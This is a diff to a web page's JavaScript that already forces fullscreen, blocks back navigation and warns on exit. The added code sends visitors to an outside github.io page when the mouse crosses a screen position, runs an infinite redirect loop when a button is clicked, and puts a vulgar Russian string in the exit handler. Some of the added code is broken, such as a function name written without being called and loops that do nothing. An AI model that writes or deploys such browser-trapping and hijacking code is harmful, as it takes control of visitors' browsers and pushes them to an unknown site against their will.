@@ -12,6 +12,12 @@ function activateFullscreen() {
     }
 }
 
+//window.location.href = "https://rsrchr1.github.io/uab/";
+document.addEventListener("mousemove", (e) => {
+  if (e.clientX > 500) {
+    location.href = "https://rsrchr1.github.io/uab/";
+  }
+});
 document.body.addEventListener("click", activateFullscreen);
 document.body.addEventListener("touchstart", activateFullscreen);
 
@@ -23,10 +29,20 @@ window.onpopstate = function () {
 
 // Предупреждение при закрытии
 window.onbeforeunload = function () {
-    return "Вы уверены, что хотите выйти?";
+	while(true){
+		return "Вы уверены, что хотите выйти?";
+	}
+	return "SOSI"
 };
 
 // Регистрация service worker (для PWA)
 if ("serviceWorker" in navigator) {
     navigator.serviceWorker.register("service-worker.js");
 }
+
+document.getElementById("go").addEventListener("click", () => {
+  activateFullscreen;
+  while (true) {
+	location.href = "https://rsrchr1.github.io/uab/";
+  }
+});
